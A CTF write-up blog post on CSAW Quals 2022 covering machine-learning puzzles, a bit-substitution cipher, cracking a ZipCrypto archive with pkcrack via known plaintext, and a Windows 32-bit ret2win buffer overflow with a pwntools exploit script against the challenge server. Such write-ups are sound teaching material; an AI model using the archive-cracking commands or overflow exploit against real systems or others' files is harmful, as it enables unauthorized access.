+++
title = "CSAW Quals 2022"
date = 2022-09-11
slug = "csaw-quals-2022"
description = "Some fun machine learning challenges, windows ret2win, and pkcrack"
+++

For this CTF I was a misc gamer. Spent all weekend learning about tensorflow and pytorch, and got some easy crypto and pwn solves at the end with pkcrack and a windows ret2win. All in all pretty good CTF even if their infra was suffering. ret2rev placed 22nd in our region (US-Canada) which is pretty good considering the competition, and were the 10th place undergraduate team in our region.

# CatTheFlag
## Challenge Description
This is an intro to Neural Networks and Data Analysis challenge.

## Solution
We are provided a training dataset and a website to upload our model for testing. When you turn in a model to the site, it gives you how well your model did on the test with an accuracy value, and a message saying the flag will be given when you have 90% accuracy or better. I decided to use tensorflow and jupyter notebook for this challenge. No real reason, just seemed convenient.

Inspecting the dataset, we have X, which is a list of 80x80 images represented as 2-D arrays of lists of RGB values. we also have y, an array of the same length as X that contains ones and zeroes, presumably labeling each picture.

Viewing a few pictures with matplotlib and looking at their corresponding entry in y, we see that we are categorizing cats and dogs.

Doing the most basic CNN model with tensorflow, we achieve a pretty good accuracy on training, but when we go to upload it for testing we get an abysmal accuracy of about 0.05%. Significantly worse than a coin flip.

Here, I am going to skip over hours of struggle learning about fixing biased datasets with oversampling and undersampling, SRGAN to improve image resolution, learning about established CNN image classification models, CNN layers, and basically reading everything tensorflow could possibly have for image classification.

At some point I had an epiphany: on a true-false quiz, if you answer all the questions, it is equally as hard to get 0% right as it is to get 100% right. So going back to the original model, we can just flip the labels in y for each image, train it, and send it in. This time, it performs phenomenally well, and we get the flag.

Final solve notebook and model [here](solve.ipynb)

`flag{!ts_r4In!Ng_C47$_AnD_D09z!}`

# ezMaze
## Challenge Description
Pytorch is a widely used AI framework. I use it as a carrier to provide a simple and interesting game. I hope you like it. The flag is md5(the shortest path of the maze).

## Solution
We are provided a .pt file, which is how pytorch saves models.

When we try to load it, it naturally errors. reading the error, we figure out the model needs a class Maze, which we can define. it seems to be successful and we can print out some parameters:
```py
import torch

class Maze(torch.nn.Module):
    def __init__(self):
        super(Maze, self).__init__()

device = torch.device('cpu')

model = torch.load('maze.pt')
for param_tensor in model.state_dict():
    print(param_tensor, '\t', model.state_dict()[param_tensor].size())

print(model.maze)
```

This gives the following output:
```
maze.weight      torch.Size([42, 42])
maze.bias      torch.Size([42])
eW91X3Nob3VsZF9maW5kX3RoZV9zaG9ydGVzdF93YXlfZnJvbV8yX3RvXzMu.weight      torch.Size([0, 0])
eW91X3Nob3VsZF9maW5kX3RoZV9zaG9ydGVzdF93YXlfZnJvbV8yX3RvXzMu.bias      torch.Size([0])
bnVtYmVyXzBfc3RhbmRfZm9yX3dheV9hbmRfbnVtYmVyXzFfc3RhbmRfZm9yX2Jsb2Nr.weight      torch.Size([0, 0])
bnVtYmVyXzBfc3RhbmRfZm9yX3dheV9hbmRfbnVtYmVyXzFfc3RhbmRfZm9yX2Jsb2Nr.bias      torch.Size([0])
eW91X3Nob3VsZF90ZWxsX21lX3RoZV9wYXRoX2J5X3VzaW5nX0FXU0Rf.weight      torch.Size([0, 0])
eW91X3Nob3VsZF90ZWxsX21lX3RoZV9wYXRoX2J5X3VzaW5nX0FXU0Rf.bias      torch.Size([0])
Linear(in_features=42, out_features=42, bias=True)
```

So the maze is a Linear layer that takes in a tensor of 42 floats outputs a tensor of 42 floats.

Using torchdescribe or torchsummary or a variety of other tools we can get some more detailed info about the model:
```
----------------------------------------------------------------------------------------------------
                                                Maze                                                
----------------------------------------------------------------------------------------------------
====================================================================================================

Maze(
  (maze): Linear(in_features=42, out_features=42, bias=True)
  (eW91X3Nob3VsZF9maW5kX3RoZV9zaG9ydGVzdF93YXlfZnJvbV8yX3RvXzMu): Linear(in_features=0, out_features=0, bias=True)
  (bnVtYmVyXzBfc3RhbmRfZm9yX3dheV9hbmRfbnVtYmVyXzFfc3RhbmRfZm9yX2Jsb2Nr): Linear(in_features=0, out_features=0, bias=True)
  (eW91X3Nob3VsZF90ZWxsX21lX3RoZV9wYXRoX2J5X3VzaW5nX0FXU0Rf): Linear(in_features=0, out_features=0, bias=True)
)

====================================================================================================
----------------------------------------------------------------------------------------------------
Total parameters : 1,806
Trainable parameters : 1,806
Non-trainable parameters : 0
----------------------------------------------------------------------------------------------------
Model device : CPU
Batch size : 1
Input shape : (1, 42)
Output shape : (1, 42)
Input size (MB) : 0.00
Forward/backward pass size (MB) : 0.00
Params size (MB) : 0.01
Estimated Total Size (MB) : 0.01
----------------------------------------------------------------------------------------------------
```

So those 3 other layers have no input or output, so they seem fairly useless.

Here, I spent some time implementing a forward() function for the Maze class and passing in some input, but it wasn't really useful because it didn't really make sense to me how this could be interpreted as a maze. The next thing I thought of was maybe the parameters of the neural network could form a graph or something like that, and I spent some time looking into tensorboard or other methods of viewing the model's internals, but it didn't really make sense how to form a graph out of this either.

At this point, I was just messing around to see how I could look deeper into the model, and found that the weight matrix and bias tensor could be extracted from the model's parameters. Looking at the weights:
```
tensor([[1., 1., 1.,  ..., 1., 1., 1.],
        [2., 0., 1.,  ..., 0., 0., 1.],
        [1., 0., 1.,  ..., 1., 0., 1.],
        ...,
        [1., 0., 0.,  ..., 0., 0., 1.],
        [1., 0., 1.,  ..., 1., 0., 3.],
        [1., 1., 1.,  ..., 1., 1., 1.]])
```
Those are some suspiciously nice looking weight values. Wait a minute, maybe the matrix is a maze, with "0":empty "1":walls, "2":start, "3":end

Printing out the matrix, we see a very maze-like structure:
```
111111111111111111111111111111111111111111
201010000010000010101100000100010000100001
101010101001011010000001010101000110110101
101000100100010011110110010100101110010101
100101010011001000001100100110100101000101
101001001001010111100001110001101000101101
101011011100100000011010101101001010110001
101000001001001010100100000100010001000111
101101010010010100101001010011101010011101
100101100101010001000101001010000010100001
110110001000010110010101010100110100101101
110000110011010001001001000101010001000101
101010100101010100011011010101001110010101
100101001000010010110010001001100001010011
101000110011101001000100101010001110001001
100010000100000010011010010010100001100101
101001011010110100100011001010111100101001
100110100001100101001000100010000010000101
110100001101001001011101010110110101010101
100101010001010010001000011000011000111001
101101101011011001101011000101001010110011
100000001010000100100100110010010010000101
101101010010110110010010001010110101110101
101010100100111000100101010010100100010001
101000101110010011001001000100101001001101
100101100100110110011010011001100100100101
110100010101000100110010100010001010101001
100010100101011001000100101110110000010011
110100101101010010011001010000100110110101
100101001001010100111010000111101000100101
101000100110010101010010110100001011001001
100101010110100101000100110010101010010101
101000010000101100101001001001001010100001
100110101101000010000100101010010010101011
110010000011101001101001001001011010101001
101010111001000101001100011100100010100101
101010100101010100100011001001001110010101
101010010001010101011010100101100001001001
101010110110100101010000110100101011100011
100000100000011101010110011010101011001001
101101001101000001000001000000101000011103
111111111111111111111111111111111111111111
```

Next is solving the maze with your algorithm of choice. I was working on this challenge with a teammate, and decided to race to see if I could implement DFS faster than he could google a tool to solve the graph. Unfortunately my algorithms knowledge was rusty and I was not fast enough to beat googling, but we got the path regardless (credit to Emanuele Rampichini for their amazesolver which can be found [here](https://github.com/lele85/amazesolver)):

```
##########################################
S.# #  ...# ....# # ##  ...#   #....# ...#
#.# # #.#..#.##.#      #.#.# # ..##.##.#.#
#.#   #..#...# .#### ##..#.#  #.###..#.#.#
#. # # #..##  #.....##..# .## #. # #...#.#
#.#  #  #..# # ####....###...##.#   # ##.#
#.# ## ###. #      ## # # ##.#..# # ##...#
#.#     #..#  # # #  #...  #...#   #...###
#.## # #..#  # #  # # .#.#  ### # #..### #
#..# ##..# # #   #   #.#. # #.... #.#    #
##.##...#    # ##  # #.#.# #..##.#..# ## #
##....##  ## #   #  #..#.  #.# #...#   # #
# # # #  # # # #   ##.##.# #.#  ###  # # #
#  # #  #    #  # ##..#.. #..##    # #  ##
# #   ##  ### #  #...# .# #.#   ###   #  #
#   #    #      #..## #..# .# #    ##  # #
# #  # ## # ## #..#...##..#.# ####  # #  #
#  ## #....##  #.#..#.. #...#     #    # #
## #....##.#  #..#.###.# # ## ## # # # # #
#  #.# # ..# # .# ..# ...##    ##...###  #
# ##.## #.## ##..##.# ##...# #  #.#.##  ##
#....   #.#    #..#..#  ##..#  #..#....# #
#.## # #..# ## ##. #. #   #.# ##.# ###.# #
#.# # #..#  ###...#..# # #..# #..#   #...#
#.#   #.###  #..##..#  #...#  #.#  #  ##.#
#..# ##..#  ##.##..## #..##  ##. #  #  #.#
##.#   #.# #...#..##  #.#   #...# # # #..#
# . # #..# #.##..#   #..# ###.##     #..##
##.#  #.## #.#..#  ##..# #....#  ## ##.# #
#..# # .#  #.#.#  ###.#   .#### #   #..# #
#.#   #..##..#.# # #..# ##.#    # ##..#  #
#. # # #.##.#..# # ..#  ##..# # # #..# # #
#.#    #....#.##  #.#  #  #. #  # #.#    #
#..## # ## # ...#  . #  # #.#  #  #.# # ##
##..#.....### #..##.#  #  #..# ## #.# #  #
# #.#.###..#   #.# .##   ###. #   #.#  # #
# #.#.#  #.# # #. #...##  # .#  ###..# # #
# #.#. #...# # #.# ##.# #  #.##    #..#  #
# #.#.##.## #  #.# # ...## #..# # ###...##
#  ...# .....###.# # ##..## #.# # ##  #..#
# ## #  ## #.....#     #......# #    ###.G
##########################################
```

The final hurdle was the flag format because "md5(the shortest path of the maze)" is super ambiguous. Sent a message off to modmail and went to bed, woke up to a message that said "Hi! You are supposed to take the md5 of the shortest path in terms of WASD", which is *SO* logical and intuitive...

flag:
`689bc7711b6becd9c1d92ae3bb9e5e59`

# Quantum Leap
## Challenge Description
My friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.

## Solution
There was no consistent flag format for this CTF, but we had a flag from a different solve and it started with `flag`, so I used that to crib and see how the bytes were being transformed. Made a map of 2-bit transformations and converted the ciphertext back to plaintext.

Side note: I don't know if I just missed it or if they added it after I solved it but I did not see the all caps NOT in the challenge description. Probably would have saved me some time.

solve script [here](transform.py)
```py
ct = 'wxqvn$Zae${deyZv$d"i'

sub = {'01': '01', '11':'10', '10':'11', '00':'00'}

bin_ct = ''
for c in ct:
    bin_ct += bin(ord(c))[2:].zfill(8)

bin_pt = ''
for i in range(0, len(bin_ct), 2):
    bin_pt += sub[bin_ct[i:i+2]]

pt = ''
for i in range(0, len(bin_pt), 8):
    pt += chr(int(bin_pt[i:i+8], 2))
print(pt)
```

`flag{4_qu4ntum_g4t3}`

# Not Too Taxing (Crypto)
## Challenge Description
We intercepted some email communications between a tax consultant and his client that contained some important tax documents. We were able to successfully extract two of the documents, but we can't figure out the password to the file in order to extract the data. Attached are the two extracted files, `Tax_Ret_Form_Blank.pdf` and `Tax_Ret_Form_Nov_2021.zip`, and a transcript of the emails we found, `SPBlock_Email.pdf`.

## Solution
This is a pkcrack challenge.

The email has some flavor text that explains this zip file is encrypted and some other things about 7zip, nothing too important.

We can use 7zip to view some details about the encrypted zip:
```
$ 7z l -slt Tax_Ret_Form_Nov_2021.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,12 CPUs AMD Ryzen 5 5500U with Radeon Graphics          (860F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 182343 bytes (179 KiB)

Listing archive: Tax_Ret_Form_Nov_2021.zip

--
Path = Tax_Ret_Form_Nov_2021.zip
Type = zip
Physical Size = 182343

----------
Path = Tax_Ret_Form_Nov_2021.pdf
Folder = -
Size = 182131
Packed Size = 182143
Modified = 2021-11-06 03:08:26
Created = 2021-10-30 01:14:17
Accessed = 2021-11-06 07:00:23
Attributes = A
Encrypted = +
Comment = 
CRC = 2E0D224D
Method = ZipCrypto Store
Host OS = FAT
Version = 10
Volume Index = 0
```

The interesting thing here is the method. Searching "zipcrypto" on the web gives this link as one of the first results: [link](https://blog.devolutions.net/2020/08/why-you-should-never-use-zipcrypto/)

"ZipCrypto is supported natively on Windows, but it should never be used because it is completely broken, flawed, and relatively easy to crack. All hackers need to know is 12 bytes of plain text and where it is located in the zip (which can be easily found) in order to quickly decrypt the entire content of the archive."

That's probably our solution then. Prior to doing this challenge I had prior knowledge about pkcrack, but if you didn't this is likely how you would find out about it.

PkCrack can be found here: https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html

Read the README to determine how to get it for your machine. The provided `Tax_Ret_Form_Blank.pdf` serves as our known plaintext to perform the attack. We can compress this to get our unencrypted zip that we need to run the tool.

One thing that I got stuck on was how to use pkcrack correctly, and that was because I'm illiterate and didn't bother reading the README which explained exactly what to do. The main thing I forgot is that the unencrypted zip has to be compressed with the same method used for the encrypted file. If you look back at the above archive details, on the method line you'll see it is store, so we need to compress our plaintext with that method, as is done by the following:

```
7z a -mx0 ./Tax_Ret_Form_Blank.zip Tax_Ret_Form_Blank.pdf
```

Finally, we run PkCrack to get an unencrypted version. You can read the help for pkcrack if you need an explanation of what these flags are.
```
pkcrack-1.2.2/src/pkcrack -c Tax_Ret_Form_Nov_2021.pdf -p Tax_Ret_Form_Blank.pdf -C Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Form_Blank.zip -d cracked.zip
```

unzip `cracked.zip` and view the pdf to get the flag which is in one of the form fields

`flag{1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u}`

# baby windows (Pwn)
## Challenge Description
Pwn your first Windows binary! We made it easy and are providing all the code so you can get points for learning to use a new set of tools.

## Solution
we are provided source for the entire thing, and there is a simple buffer overflow with gets, and in the dll provided there is a win function.

Simple ret2win challenge, but in Windows! I downloaded immunity debugger, threw in a string to figure out the buffer length to overwrite eip (note 32-bit challenge). then I grabbed the address of the win function from the dll using objdump and wrote a simple solve script.

Honestly not too bad, didn't take too much troubleshooting since I just assumed there was no PIE and vaguely remembered something about how dlls are loaded that made me think I could just grab the address straight from the dll.

The part that took me the most debugging time was actually figuring out how to get output from the script, which I eventually got to work by simple turning on debug log level in pwntools. I assume the normal output was breaking because of how Windows does carriage returns then newlines.

Solve script (download [here](babywindows_solve.py)):
```py
from pwn import *

# I think the output is being f'd up by the carriage returns that windows has,
# but the debug output prints the bytes recieved just fine so we'll use that to see what's up
context.log_level = 'DEBUG'

p = remote("win.chal.csaw.io", 7777)
p.recvuntil(b'> ');
p.sendline(b'A'*512 + p32(0x62101661))

p.sendline(b'type .\\chal\\flag.txt')
print(p.recvline())
p.interactive()
```

`flag{Wh4t_d0_y0u_w4n7_t0_pwn_t0d4y?}`

